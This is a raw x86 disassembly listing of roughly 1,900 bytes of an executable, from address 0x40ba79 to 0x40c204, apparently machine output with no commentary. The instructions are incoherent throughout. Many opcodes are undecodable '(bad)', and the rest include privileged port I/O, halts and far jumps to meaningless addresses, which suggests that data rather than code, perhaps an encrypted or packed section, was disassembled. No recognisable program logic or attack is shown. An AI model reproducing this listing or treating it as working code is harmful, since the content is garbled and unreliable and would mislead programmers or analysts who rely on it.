  40ba79:	bound  ecx,QWORD PTR [ebx+0x45b0152b]
  40ba7f:	mov    ah,0xc6
  40ba81:	push   ss
  40ba82:	enter  0x9d56,0xc3
  40ba86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba87:	fimul  DWORD PTR ds:0x1d134d74
  40ba8d:	cmp    eax,0xfa60b40
  40ba92:	xor    DWORD PTR [eax],ebx
  40ba94:	inc    esp
  40ba95:	(bad)  
  40ba96:	fnstenv [ebp-0x1f3bbb10]
  40ba9c:	pop    ecx
  40ba9d:	into   
  40ba9e:	dec    edx
  40ba9f:	mov    edi,0x1f13868f
  40baa4:	out    dx,al
  40baa5:	or     al,al
  40baa7:	out    dx,eax
  40baa8:	or     al,0x86
  40baaa:	pop    eax
  40baab:	call   0xfb259feb
  40bab0:	(bad)  
  40bab1:	push   eax
  40bab2:	(bad)  
  40bab3:	jne    0x40bb29
  40bab5:	stos   BYTE PTR es:[edi],al
  40bab6:	mov    dl,0xc
  40bab8:	div    ch
  40baba:	and    al,BYTE PTR [ebp+ecx*2-0x18]
  40babe:	adc    DWORD PTR [edx+edi*1+0x7a],ecx
  40bac2:	fild   DWORD PTR [ebx]
  40bac4:	mov    edi,ss
  40bac6:	jmp    0xaa441aa7
  40bacb:	(bad)  
  40bacc:	pop    ds
  40bacd:	jmp    0x40ba5f
  40bacf:	in     eax,0x6
  40bad1:	fisubr WORD PTR [edi-0x73]
  40bad4:	dec    esi
  40bad5:	sub    ch,BYTE PTR [edi+0xc]
  40bad8:	jmp    0x15ce:0xcf4fc428
  40badf:	dec    eax
  40bae0:	jae    0x40bb24
  40bae2:	mov    ebx,0xdef7acbc
  40bae7:	add    esi,DWORD PTR [edi+0x6562de61]
  40baed:	mov    ch,0xaa
  40baef:	retf   0xc005
  40baf2:	in     al,0x9a
  40baf4:	aaa    
  40baf5:	jle    0x40bb38
  40baf7:	push   cs
  40baf8:	push   cs
  40baf9:	push   es
  40bafa:	or     BYTE PTR [edi],ch
  40bafc:	lahf   
  40bafd:	mov    ds:0xb6803d05,al
  40bb02:	push   ecx
  40bb03:	add    eax,DWORD PTR [eax-0x65]
  40bb06:	stos   BYTE PTR es:[edi],al
  40bb07:	clts   
  40bb09:	mov    eax,0xae9063da
  40bb0e:	adc    bh,BYTE PTR [ebp+0x4e]
  40bb11:	inc    edx
  40bb12:	aaa    
  40bb13:	pop    ds
  40bb14:	push   esp
  40bb15:	push   ebx
  40bb16:	sub    al,0xbb
  40bb18:	and    edx,DWORD PTR [ebx]
  40bb1a:	and    eax,0xadf1b13e
  40bb1f:	mov    dh,0xa5
  40bb21:	loopne 0x40bb2b
  40bb23:	sub    DWORD PTR [ecx+ebp*2+0x68],esp
  40bb27:	xchg   ebp,eax
  40bb28:	sbb    esi,DWORD PTR [ebx+0x6c]
  40bb2b:	jge    0x40bba5
  40bb2d:	hlt    
  40bb2e:	dec    ebx
  40bb2f:	mul    BYTE PTR [esi+edx*4+0x1a]
  40bb33:	push   eax
  40bb34:	sub    BYTE PTR [esi-0x56],dh
  40bb37:	es or  esp,0x34eb8152
  40bb3e:	cmp    ecx,DWORD PTR [ebp+0x69313746]
  40bb44:	pop    eax
  40bb45:	lods   al,BYTE PTR ds:[esi]
  40bb46:	es jmp 0xc6c8:0x57193aed
  40bb4e:	dec    eax
  40bb4f:	out    dx,eax
  40bb50:	xor    BYTE PTR ds:0x5ff655c1,ch
  40bb56:	in     eax,0x17
  40bb58:	and    esp,ecx
  40bb5a:	pop    ss
  40bb5b:	add    cl,BYTE PTR [ecx-0x3a16817b]
  40bb61:	pop    ss
  40bb62:	iret   
  40bb63:	sbb    edx,DWORD PTR [eax+eiz*8]
  40bb66:	int    0x90
  40bb68:	push   eax
  40bb69:	xchg   ebx,eax
  40bb6a:	push   ebx
  40bb6b:	call   0xf261c38b
  40bb70:	cmovg  eax,edx
  40bb73:	add    BYTE PTR [ebp-0x4aa2f4f],ch
  40bb79:	dec    edi
  40bb7a:	push   cs
  40bb7b:	mov    ds,WORD PTR [edx+0x2d42c22a]
  40bb81:	push   ecx
  40bb82:	xchg   ecx,eax
  40bb83:	jmp    0x21f49e8a
  40bb88:	retf   0xbbb2
  40bb8b:	jne    0x40bb97
  40bb8d:	jg     0x40bbc8
  40bb8f:	xor    BYTE PTR [edx+0x7b],bh
  40bb92:	xor    BYTE PTR [esi],bh
  40bb94:	mov    WORD PTR [edx],ds
  40bb96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb97:	sbb    ch,bl
  40bb99:	sbb    BYTE PTR [ecx-0x79],bl
  40bb9c:	jge    0x40bb7a
  40bb9e:	and    al,0x8b
  40bba0:	mov    ds:0x23c0d92,al
  40bba5:	js     0x40bb48
  40bba7:	repnz add eax,0x446d1d9b
  40bbad:	dec    eax
  40bbae:	xlat   BYTE PTR ds:[ebx]
  40bbaf:	mov    eax,ds:0xc8d5e2b6
  40bbb4:	jmp    0x2ed8:0xb244ad26
  40bbbb:	test   DWORD PTR [ecx+0x4a0123a],ebp
  40bbc1:	mov    ds:0x2f853ad1,eax
  40bbc6:	adc    edx,DWORD PTR [edx-0x27ed6b0b]
  40bbcc:	aas    
  40bbcd:	push   edx
  40bbce:	in     al,0x85
  40bbd0:	or     al,0xe0
  40bbd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbd3:	mov    cl,0xf2
  40bbd5:	mov    WORD PTR [ecx+ecx*4],es
  40bbd8:	mov    ebx,0x3fe73059
  40bbdd:	in     eax,dx
  40bbde:	popa   
  40bbdf:	mov    edx,0x730cfd82
  40bbe4:	aam    0xfb
  40bbe6:	icebp  
  40bbe7:	test   al,0x78
  40bbe9:	fild   QWORD PTR [edx+0x39315d94]
  40bbef:	enter  0xe834,0x5a
  40bbf3:	fisubr DWORD PTR [edi+edi*2]
  40bbf6:	xlat   BYTE PTR ds:[ebx]
  40bbf7:	int    0x89
  40bbf9:	sub    al,BYTE PTR ds:0x1ea4b56f
  40bbff:	lahf   
  40bc00:	jp     0x40bc66
  40bc02:	repz ror BYTE PTR [ebp-0x4ea10182],cl
  40bc09:	je     0x40bc1d
  40bc0b:	ficomp DWORD PTR [ebx]
  40bc0d:	call   0x3718:0x1abc8ecf
  40bc14:	push   ecx
  40bc15:	jg     0x40bc36
  40bc17:	hlt    
  40bc18:	pop    eax
  40bc19:	adc    DWORD PTR [ebp+0x58916e28],0x45
  40bc20:	jne    0x40bba5
  40bc22:	push   ebp
  40bc23:	push   ds
  40bc24:	push   edx
  40bc25:	pop    esp
  40bc26:	jl     0x40bbab
  40bc28:	push   esi
  40bc29:	test   al,0xd1
  40bc2b:	xlat   BYTE PTR ds:[ebx]
  40bc2c:	rcl    DWORD PTR [ebp+0x758a9e63],1
  40bc32:	lock cmc 
  40bc34:	jecxz  0x40bc78
  40bc36:	lds    edi,FWORD PTR [edx]
  40bc38:	push   edx
  40bc39:	jae    0x40bcaf
  40bc3b:	fdivrp st(3),st
  40bc3d:	pop    eax
  40bc3e:	xchg   edi,eax
  40bc3f:	add    BYTE PTR [eax],cl
  40bc41:	in     al,0xa5
  40bc43:	push   cs
  40bc44:	into   
  40bc45:	sbb    al,0x87
  40bc47:	mov    bl,0xd1
  40bc49:	cwde   
  40bc4a:	ja     0x40bbef
  40bc4c:	cld    
  40bc4d:	aam    0x82
  40bc4f:	ffreep st(0)
  40bc51:	mov    bh,BYTE PTR [ebp+0x0]
  40bc54:	mov    esi,0xb451308
  40bc59:	jne    0x40bc0b
  40bc5b:	push   0xffffffd8
  40bc5d:	xor    esp,ebx
  40bc5f:	mov    edx,0x6bc7aa4
  40bc64:	mov    eax,ds:0x2be287d1
  40bc69:	rcr    DWORD PTR [ebp+0x6],0xc6
  40bc6d:	mov    bh,0x97
  40bc6f:	je     0x40bc32
  40bc71:	rol    DWORD PTR [ebx],0xc3
  40bc74:	and    esp,0xa95e788f
  40bc7a:	mov    eax,0x55cc2a3c
  40bc7f:	retf   0x194a
  40bc82:	(bad)  
  40bc83:	fcmovnu st,st(0)
  40bc85:	and    eax,DWORD PTR [ecx-0xa]
  40bc88:	jbe    0x40bca1
  40bc8a:	adc    al,0xc1
  40bc8c:	or     DWORD PTR [ebp-0x3dd0ceaf],0x28eba2c0
  40bc96:	into   
  40bc97:	pop    ecx
  40bc98:	pop    es
  40bc99:	inc    ebx
  40bc9a:	sub    ebp,DWORD PTR [edx]
  40bc9c:	in     eax,0x7a
  40bc9e:	mov    dl,0xc7
  40bca0:	shl    al,0x1a
  40bca3:	lea    eax,[ecx-0x7bc7ca8a]
  40bca9:	jmp    0x5284148c
  40bcae:	sub    al,0xe5
  40bcb0:	aad    0x59
  40bcb2:	retf   
  40bcb3:	adc    BYTE PTR [ebx],ah
  40bcb5:	push   edi
  40bcb6:	cmp    esi,DWORD PTR [edx-0x19]
  40bcb9:	dec    esp
  40bcba:	call   0x365f:0x21af0233
  40bcc1:	aad    0xb
  40bcc3:	fnstcw WORD PTR [edx+0x45]
  40bcc6:	loope  0x40bc9a
  40bcc8:	shr    dh,1
  40bcca:	jmp    0x730eb67d
  40bccf:	push   ds
  40bcd0:	dec    esp
  40bcd1:	fxam   
  40bcd3:	mov    ebx,0xf908d210
  40bcd8:	sbb    eax,0xb4928dc3
  40bcdd:	mov    bh,0xe8
  40bcdf:	xchg   edi,eax
  40bce0:	xchg   edx,eax
  40bce1:	or     al,0xfe
  40bce3:	les    edi,FWORD PTR [edi+0xff02496]
  40bce9:	mov    dl,0xda
  40bceb:	std    
  40bcec:	xchg   ebp,eax
  40bced:	(bad)  
  40bcee:	sbb    ebx,DWORD PTR [ecx+0x15]
  40bcf1:	jne    0x40bc7a
  40bcf3:	push   0xa649251b
  40bcf8:	fwait
  40bcf9:	jge    0x40bd6b
  40bcfb:	mov    esp,0x8a431fa3
  40bd00:	mov    edx,DWORD PTR [edx]
  40bd02:	push   ecx
  40bd03:	sub    BYTE PTR [eax+0x60],0x3
  40bd07:	arpl   WORD PTR [ecx+edi*8-0x5bdd580a],bp
  40bd0e:	daa    
  40bd0f:	dec    ebx
  40bd10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd11:	xchg   esi,eax
  40bd12:	mov    edi,0xd587f61c
  40bd17:	lods   al,BYTE PTR ds:[esi]
  40bd18:	imul   bh
  40bd1a:	fsubrp st(2),st
  40bd1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd1d:	jae    0x40bd9d
  40bd1f:	cwde   
  40bd20:	xor    DWORD PTR [edi+eax*2],0xaae9d5d1
  40bd27:	aas    
  40bd28:	mov    dl,0xc5
  40bd2a:	mov    cs:0xd6e1e475,eax
  40bd30:	jne    0x40bd04
  40bd32:	and    BYTE PTR [esi+0x57],dl
  40bd35:	xchg   ebp,eax
  40bd36:	cmc    
  40bd37:	das    
  40bd38:	daa    
  40bd39:	sbb    al,0x4b
  40bd3b:	and    ch,ch
  40bd3d:	sub    DWORD PTR [ebp-0x16af0197],0x28cee0d3
  40bd47:	cs fs jo 0x40bd6f
  40bd4b:	dec    edi
  40bd4c:	fidiv  DWORD PTR [ebx-0x6f806833]
  40bd52:	jno    0x40bd28
  40bd54:	mov    edx,ecx
  40bd56:	jae    0x40bd5b
  40bd58:	sti    
  40bd59:	jg     0x40bda9
  40bd5b:	mov    ss,WORD PTR [ecx-0x79]
  40bd5e:	pushf  
  40bd5f:	data16 jmp 0x40bd17
  40bd62:	pop    ss
  40bd63:	xchg   edx,eax
  40bd64:	push   edx
  40bd65:	cmp    BYTE PTR [esi+0x54],0xd8
  40bd69:	shr    DWORD PTR [ebx-0x47],1
  40bd6c:	loopne 0x40bd98
  40bd6e:	pop    es
  40bd6f:	mov    DWORD PTR [ebx+0x60a8fc3c],esp
  40bd75:	push   edi
  40bd76:	xor    DWORD PTR [edi+0x12],edi
  40bd79:	cld    
  40bd7a:	scas   eax,DWORD PTR es:[edi]
  40bd7b:	xchg   esi,eax
  40bd7c:	mov    ds:0x64bc9b84,eax
  40bd81:	mov    bl,0x90
  40bd83:	aaa    
  40bd84:	(bad)  
  40bd85:	pop    ss
  40bd86:	pop    edi
  40bd87:	repz dec ecx
  40bd89:	arpl   WORD PTR [ecx+ebp*8],si
  40bd8c:	sbb    bl,BYTE PTR ds:0x36792fd5
  40bd92:	and    eax,0x3f765f5a
  40bd97:	inc    ebx
  40bd98:	lods   al,BYTE PTR ds:[esi]
  40bd99:	data16 repz mov cl,0xf1
  40bd9d:	iret   
  40bd9e:	pop    esi
  40bd9f:	(bad)  
  40bda0:	mov    edx,0xf67b9b43
  40bda5:	ret    0x2e99
  40bda8:	jnp    0x40bda6
  40bdaa:	loope  0x40bd5a
  40bdac:	xor    ecx,DWORD PTR [ecx+0x2520bd32]
  40bdb2:	or     al,0x83
  40bdb4:	cmp    al,0xfd
  40bdb6:	mov    eax,ds:0xd8a8699b
  40bdbb:	jl     0x40bd8f
  40bdbd:	inc    ecx
  40bdbe:	out    dx,al
  40bdbf:	mov    esp,0x19489506
  40bdc4:	jnp    0x40bd5d
  40bdc6:	ss cwde 
  40bdc8:	dec    ecx
  40bdc9:	mov    cl,0x81
  40bdcb:	cli    
  40bdcc:	push   0xffffff81
  40bdce:	sbb    edx,eax
  40bdd0:	jb     0x40bdaf
  40bdd2:	in     eax,0xb1
  40bdd4:	pop    eax
  40bdd5:	mov    esp,0x91760e6e
  40bdda:	and    al,0x49
  40bddc:	jnp    0x40be18
  40bdde:	jmp    0x83726f1c
  40bde3:	stos   DWORD PTR es:[edi],eax
  40bde4:	mov    dh,0x89
  40bde6:	dec    edx
  40bde7:	and    BYTE PTR [ecx+0x6b],ch
  40bdea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdeb:	pop    esi
  40bdec:	adc    eax,0x2a5e68c2
  40bdf1:	xchg   ebx,eax
  40bdf2:	aad    0x13
  40bdf4:	add    DWORD PTR [ebx],0xffffff98
  40bdf7:	pop    ebx
  40bdf8:	dec    edi
  40bdf9:	mov    cl,0x9f
  40bdfb:	xor    eax,0xff932c52
  40be00:	fsubr  st(3),st
  40be02:	cli    
  40be03:	mul    bl
  40be05:	outs   dx,DWORD PTR ds:[esi]
  40be06:	and    BYTE PTR [eax+0x2b8b072f],bl
  40be0c:	aad    0xd0
  40be0e:	loop   0x40bde0
  40be10:	bnd jbe 0x40be3c
  40be13:	popa   
  40be14:	add    eax,DWORD PTR [edx-0x2e707d6d]
  40be1a:	and    bh,ch
  40be1c:	pop    ebx
  40be1d:	jmp    0xfd9b:0xa73e866d
  40be24:	sub    DWORD PTR [ebp-0x1d24ee43],edx
  40be2a:	in     eax,dx
  40be2b:	ror    DWORD PTR [esi-0x1f733d1c],0x95
  40be32:	sbb    BYTE PTR [eax+esi*1+0x9],cl
  40be36:	xchg   edx,esp
  40be38:	test   eax,0xff5d46f9
  40be3d:	push   0xa0505032
  40be42:	popf   
  40be43:	mov    cl,0x1
  40be45:	mov    ebx,0x5486fdfc
  40be4a:	div    DWORD PTR ds:[ecx+0x62]
  40be4e:	xchg   ecx,eax
  40be4f:	xchg   ecx,eax
  40be50:	xchg   esi,eax
  40be51:	jo     0x40be72
  40be53:	in     al,dx
  40be54:	in     eax,dx
  40be55:	hlt    
  40be56:	scas   al,BYTE PTR es:[edi]
  40be57:	inc    ebp
  40be58:	retf   0x81b
  40be5b:	cmp    ebx,edx
  40be5d:	repz inc edi
  40be5f:	mov    edi,0xf791fd05
  40be64:	imul   esi,DWORD PTR [edx],0xffffffb9
  40be67:	(bad)  
  40be69:	pop    ecx
  40be6a:	loopne 0x40be6b
  40be6c:	sub    al,0xc0
  40be6e:	jmp    0x8871:0x6adb4fb8
  40be75:	test   DWORD PTR [ebp-0x20],esi
  40be78:	call   0x666cdf20
  40be7d:	(bad)  
  40be7e:	out    0xf,al
  40be80:	jl     0x40be39
  40be82:	mov    BYTE PTR ds:0xb1f788e0,dh
  40be88:	test   DWORD PTR [edx-0x12be9301],ebp
  40be8e:	(bad)
  40be91:	pop    edx
  40be92:	jae    0x40bee1
  40be94:	xchg   ecx,eax
  40be95:	leave  
  40be96:	es mov ah,0x1e
  40be99:	dec    esp
  40be9a:	test   dh,dh
  40be9c:	sbb    ebp,DWORD PTR [edx+0x5ad06a69]
  40bea2:	jmp    0x40bf08
  40bea4:	sbb    DWORD PTR [edi+0xb2362a5],0x1396a5e0
  40beae:	out    dx,eax
  40beaf:	nop
  40beb0:	mov    al,0x57
  40beb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beb3:	js     0x40bec8
  40beb5:	and    cl,ah
  40beb7:	rcl    BYTE PTR [ebp-0x14b5adb7],cl
  40bebd:	cmp    eax,0xbb2f885c
  40bec2:	add    BYTE PTR [edx],ah
  40bec4:	(bad)  
  40bec6:	std    
  40bec7:	pop    esi
  40bec8:	enter  0x1aea,0xaa
  40becc:	sbb    DWORD PTR [eax+0x47],0x4ab37bef
  40bed3:	sbb    DWORD PTR [ecx+0x404ee444],ebp
  40bed9:	push   ebx
  40beda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bedb:	inc    esp
  40bedc:	sub    eax,0x72c3ab40
  40bee1:	ins    DWORD PTR es:[edi],dx
  40bee2:	cmp    eax,0x5aa52432
  40bee7:	jmp    0x40bef5
  40bee9:	scas   eax,DWORD PTR es:[edi]
  40beea:	scas   eax,DWORD PTR es:[edi]
  40beeb:	jmp    0x57e32c4a
  40bef0:	popf   
  40bef1:	push   eax
  40bef2:	push   ds
  40bef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bef4:	(bad)  
  40bef5:	push   edi
  40bef6:	fdiv   DWORD PTR [eax]
  40bef8:	inc    edx
  40bef9:	ss call 0xe7e5:0x1240
  40bf00:	outs   dx,DWORD PTR ds:[esi]
  40bf01:	div    DWORD PTR ds:0xbb328b63
  40bf07:	(bad)  
  40bf09:	fwait
  40bf0a:	mul    BYTE PTR [edx+0x72]
  40bf0d:	mov    ecx,DWORD PTR [edi]
  40bf0f:	fs jmp 0xeb9ea2da
  40bf15:	test   al,0x91
  40bf17:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40bf19:	mov    edi,0x6d22679f
  40bf1e:	jmp    0x7ab501a7
  40bf23:	or     dl,0xc1
  40bf26:	aaa    
  40bf27:	inc    eax
  40bf28:	clc    
  40bf29:	xchg   ebx,eax
  40bf2a:	in     al,0x56
  40bf2c:	stos   DWORD PTR es:[edi],eax
  40bf2d:	test   al,0xda
  40bf2f:	mov    edi,0x482646cf
  40bf34:	aam    0x99
  40bf36:	xchg   edx,eax
  40bf37:	call   0x787b1112
  40bf3c:	hlt    
  40bf3d:	aad    0x6b
  40bf3f:	retf   0xde73
  40bf42:	aaa    
  40bf43:	xchg   DWORD PTR [ebx],eax
  40bf45:	(bad)  
  40bf46:	movq   mm1,mm6
  40bf49:	mov    WORD PTR [edx+0x17],ss
  40bf4c:	dec    edi
  40bf4d:	push   eax
  40bf4e:	in     al,dx
  40bf4f:	retf   
  40bf50:	ret    0x63e5
  40bf53:	jnp    0x40bfb7
  40bf55:	mov    esi,0xa946c767
  40bf5a:	cmp    eax,0xdbfdd488
  40bf5f:	cmp    ebx,edi
  40bf61:	hlt    
  40bf62:	test   eax,0xcfbb5422
  40bf67:	popf   
  40bf68:	clc    
  40bf69:	popf   
  40bf6a:	dec    edi
  40bf6b:	sbb    al,0xb7
  40bf6d:	or     DWORD PTR [esi],edx
  40bf6f:	or     bh,bh
  40bf71:	pushf  
  40bf72:	mov    al,0x38
  40bf74:	sub    al,0x84
  40bf76:	and    edx,DWORD PTR [eax+0x77bb5d92]
  40bf7c:	in     eax,dx
  40bf7d:	mul    BYTE PTR [eax]
  40bf7f:	ds mov bl,0xca
  40bf82:	adc    DWORD PTR [ebx],ebp
  40bf84:	pop    eax
  40bf85:	ja     0x40bf1d
  40bf87:	mov    edi,0xff149615
  40bf8c:	dec    eax
  40bf8d:	mov    BYTE PTR [edx-0x3068c07d],ah
  40bf93:	pop    edx
  40bf94:	bound  ecx,QWORD PTR [ebx+0x17f22844]
  40bf9a:	add    edx,edi
  40bf9c:	push   edx
  40bf9d:	jno    0x40bf35
  40bf9f:	sbb    BYTE PTR [ebp-0x5aaddd42],cl
  40bfa5:	add    ah,BYTE PTR [eax-0x25]
  40bfa8:	mov    ds:0x65183fab,eax
  40bfad:	pop    ds
  40bfae:	sbb    al,0xbf
  40bfb0:	jne    0x40c02b
  40bfb2:	pop    eax
  40bfb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfb4:	push   cs
  40bfb5:	xor    ecx,DWORD PTR [ebx]
  40bfb7:	cmp    ebx,DWORD PTR [ebp+0x7f6257e7]
  40bfbd:	dec    edx
  40bfbe:	fwait
  40bfbf:	leave  
  40bfc0:	pop    ss
  40bfc1:	test   DWORD PTR [esi],ecx
  40bfc3:	es aam 0x2b
  40bfc6:	mov    WORD PTR ds:0x302964df,?
  40bfcc:	pop    esp
  40bfcd:	icebp  
  40bfce:	fdivr  QWORD PTR [ebx-0x487ff374]
  40bfd4:	xchg   DWORD PTR [edx+eax*8+0xc],ecx
  40bfd8:	dec    edi
  40bfd9:	fwait
  40bfda:	cmp    ebp,DWORD PTR [edx+0x72]
  40bfdd:	push   ss
  40bfde:	push   edx
  40bfdf:	adc    DWORD PTR [ecx-0x7cacac4d],0x55611a27
  40bfe9:	std    
  40bfea:	inc    esi
  40bfeb:	or     eax,0xa414efd3
  40bff0:	jmp    0xa072:0x88783326
  40bff7:	dec    esp
  40bff8:	in     al,0xf1
  40bffa:	and    al,0x23
  40bffc:	and    DWORD PTR [ebp+0x68],0xffffff85
  40c000:	addr16 loope 0x40c04e
  40c003:	xchg   ebp,eax
  40c004:	imul   ebx,DWORD PTR [ecx],0xffffff8a
  40c007:	imul   edi,ecx,0xffffffc3
  40c00a:	adc    dh,al
  40c00c:	in     al,0xa
  40c00e:	stc    
  40c00f:	ja     0x40bf97
  40c011:	cli    
  40c012:	ss inc edx
  40c014:	scas   eax,DWORD PTR es:[edi]
  40c015:	mov    ebp,0x9f419d91
  40c01a:	inc    ecx
  40c01b:	gs nop
  40c01d:	out    0x81,al
  40c01f:	add    BYTE PTR [ebx-0x43a54765],bl
  40c025:	lods   eax,DWORD PTR ds:[esi]
  40c026:	xchg   edx,eax
  40c027:	push   ebp
  40c028:	and    eax,0xf307ca01
  40c02d:	adc    dh,BYTE PTR [edx-0x151bcfbb]
  40c033:	xchg   ebx,eax
  40c034:	jle    0x40c00d
  40c036:	repz fidiv WORD PTR [esp+edi*1]
  40c03a:	lds    edx,FWORD PTR [eax+0x319a2e2c]
  40c040:	jle    0x40c02e
  40c042:	xchg   esi,eax
  40c043:	xor    bl,BYTE PTR [edx]
  40c045:	jle    0x40c038
  40c047:	(bad)  
  40c049:	inc    BYTE PTR es:[edi]
  40c04c:	imul   edx,ebp,0xffffffcc
  40c04f:	in     al,0x19
  40c051:	pop    edx
  40c052:	rcr    DWORD PTR [ebx],1
  40c054:	pushf  
  40c055:	enter  0x1120,0xe
  40c059:	inc    ebx
  40c05a:	push   edi
  40c05b:	mov    ds:0x34c4302f,al
  40c060:	sub    esp,ebx
  40c062:	cld    
  40c063:	xchg   esi,eax
  40c064:	lock jne 0x40c052
  40c067:	push   ss
  40c068:	aaa    
  40c069:	stos   BYTE PTR es:[edi],al
  40c06a:	iret   
  40c06b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c06c:	mov    ebp,0x7eb0d264
  40c071:	sbb    al,0xef
  40c073:	jg     0x40c0ee
  40c075:	cdq    
  40c076:	jns    0x40c0ec
  40c078:	mov    DWORD PTR [edx-0x202ccd70],ecx
  40c07e:	dec    esi
  40c07f:	mov    al,ds:0x6b0d8b6f
  40c084:	mov    BYTE PTR [edx+ebx*4+0x73e2cd4b],dl
  40c08b:	add    BYTE PTR ds:0xd7103407,bl
  40c091:	retf   0x727c
  40c094:	lods   eax,DWORD PTR ds:[esi]
  40c095:	cmc    
  40c096:	popf   
  40c097:	push   0xa357d216
  40c09c:	jmp    0xdec9:0xdf36ff0f
  40c0a3:	or     BYTE PTR [edi-0x5d],dl
  40c0a6:	mov    dl,0x44
  40c0a8:	jle    0x40c0b0
  40c0aa:	xchg   esp,eax
  40c0ab:	rcl    BYTE PTR [eax+ebp*8],1
  40c0ae:	cmp    ch,bl
  40c0b0:	inc    eax
  40c0b1:	sub    cl,BYTE PTR [esi]
  40c0b3:	jp     0x40c0ec
  40c0b5:	ja     0x40c0da
  40c0b7:	sbb    edi,ecx
  40c0b9:	jno    0x40c0d0
  40c0bb:	xlat   BYTE PTR ds:[ebx]
  40c0bc:	int    0x79
  40c0be:	hlt    
  40c0bf:	sbb    eax,0x15cb5d73
  40c0c4:	xor    al,0xbd
  40c0c6:	jb     0x40c0b0
  40c0c8:	inc    ecx
  40c0c9:	ret    
  40c0ca:	lods   al,BYTE PTR ds:[esi]
  40c0cb:	dec    esp
  40c0cc:	pop    ecx
  40c0cd:	or     BYTE PTR [ecx],0x91
  40c0d0:	sar    DWORD PTR [edi+0x24a675a2],1
  40c0d6:	fcomp  DWORD PTR [edi+edx*1+0x7e]
  40c0da:	fdiv   st,st(3)
  40c0dc:	mov    esp,eax
  40c0de:	push   esi
  40c0df:	imul   esi,DWORD PTR [edi-0x15],0x5519dff7
  40c0e6:	mov    ch,0x41
  40c0e8:	cmp    eax,0x380f0649
  40c0ed:	mov    bh,0x7e
  40c0ef:	sub    BYTE PTR [ebp-0x73],al
  40c0f2:	lahf   
  40c0f3:	out    0x2f,eax
  40c0f5:	ins    DWORD PTR es:[edi],dx
  40c0f6:	dec    esp
  40c0f7:	dec    edx
  40c0f8:	test   eax,0x5bbdd844
  40c0fd:	out    dx,al
  40c0fe:	mov    eax,DWORD PTR [edx]
  40c100:	rol    ah,1
  40c102:	sub    BYTE PTR [ebx+esi*2+0x42988ab],0xea
  40c10a:	jo     0x40c188
  40c10c:	mov    eax,ds:0x874f3f0a
  40c111:	add    eax,0xc2855c7c
  40c116:	sbb    BYTE PTR [esp+edx*4],0x29
  40c11a:	inc    esp
  40c11b:	push   ebx
  40c11c:	test   dh,dh
  40c11e:	pop    eax
  40c11f:	lock pusha 
  40c121:	adc    ah,BYTE PTR [eax-0x3d74f930]
  40c127:	sub    al,0xad
  40c129:	jns    0x40c198
  40c12b:	fisttp WORD PTR [ebx]
  40c12d:	in     al,0x45
  40c12f:	in     al,dx
  40c130:	mov    dh,0xaa
  40c132:	scas   eax,DWORD PTR es:[edi]
  40c133:	mov    eax,0xc9bb4280
  40c138:	and    ecx,DWORD PTR ds:[ecx-0x5b59edc5]
  40c13f:	sbb    esi,edx
  40c141:	and    dh,ah
  40c143:	mov    ecx,0xf4521e2e
  40c148:	cdq    
  40c149:	cmp    al,0xc1
  40c14b:	mov    eax,0xb4eba5a
  40c150:	(bad)  [esi+0x77]
  40c153:	lock das 
  40c155:	xor    ecx,DWORD PTR [edx]
  40c157:	aam    0xe9
  40c159:	jns    0x40c116
  40c15b:	mov    cl,0xfc
  40c15d:	(bad)  
  40c15e:	(bad)  
  40c15f:	into   
  40c160:	iret   
  40c161:	pusha  
  40c162:	ret    0x60ef
  40c165:	add    esp,DWORD PTR [edi]
  40c167:	sub    eax,0xec255858
  40c16c:	mov    esi,DWORD PTR [esi+0x19]
  40c16f:	repz sub esp,DWORD PTR [esi+0x4]
  40c173:	sbb    bl,cl
  40c175:	rol    DWORD PTR [ecx],0x59
  40c178:	loop   0x40c164
  40c17a:	data16 mov ch,0xab
  40c17d:	and    eax,0xd53e5482
  40c182:	add    BYTE PTR [eax],ah
  40c184:	test   ecx,edi
  40c186:	sub    al,0xf
  40c188:	stc    
  40c189:	sub    ebx,DWORD PTR [eax+0x510b3f91]
  40c18f:	popf   
  40c190:	push   eax
  40c191:	sub    ecx,DWORD PTR [ebx*1+0x20179026]
  40c198:	mov    ecx,0xb7118abe
  40c19d:	xchg   edi,eax
  40c19e:	fdiv   DWORD PTR [edi-0x7a7f3273]
  40c1a4:	inc    ebx
  40c1a5:	mov    ecx,0xae4511b0
  40c1aa:	or     DWORD PTR [esi-0x22],ebp
  40c1ad:	pop    edi
  40c1ae:	shl    DWORD PTR [ecx],1
  40c1b0:	inc    ebx
  40c1b1:	cmp    eax,0x8ac50417
  40c1b6:	or     DWORD PTR [ecx-0x386ed634],0x84db0a0f
  40c1c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1c1:	cdq    
  40c1c2:	inc    eax
  40c1c3:	xchg   ecx,eax
  40c1c4:	add    bl,BYTE PTR [eax+0x76]
  40c1c7:	nop
  40c1c8:	xchg   ecx,eax
  40c1c9:	mov    ah,0xa4
  40c1cb:	inc    esi
  40c1cc:	nop
  40c1cd:	sub    eax,0xd3f961c8
  40c1d2:	int    0xd5
  40c1d4:	outs   dx,BYTE PTR ds:[esi]
  40c1d5:	cmp    ebx,esi
  40c1d7:	mov    fs,WORD PTR [ecx+0x7a]
  40c1da:	dec    eax
  40c1db:	xchg   edi,eax
  40c1dc:	adc    ecx,ebp
  40c1de:	adc    DWORD PTR [edi-0x48b001ae],ebp
  40c1e4:	nop
  40c1e5:	mov    dh,0x9e
  40c1e7:	or     al,0xe7
  40c1e9:	mov    ds:0x886f94ec,eax
  40c1ee:	xor    ch,cl
  40c1f0:	jg     0x40c1ed
  40c1f2:	jmp    0x40c1e6
  40c1f4:	shr    DWORD PTR [eax-0x5d2f794],1
  40c1fa:	inc    eax
  40c1fb:	setae  BYTE PTR [ebp+0x2e]
  40c1ff:	mov    ecx,0x9d05723f
  40c204:	rcr    BYTE PTR [esi],cl
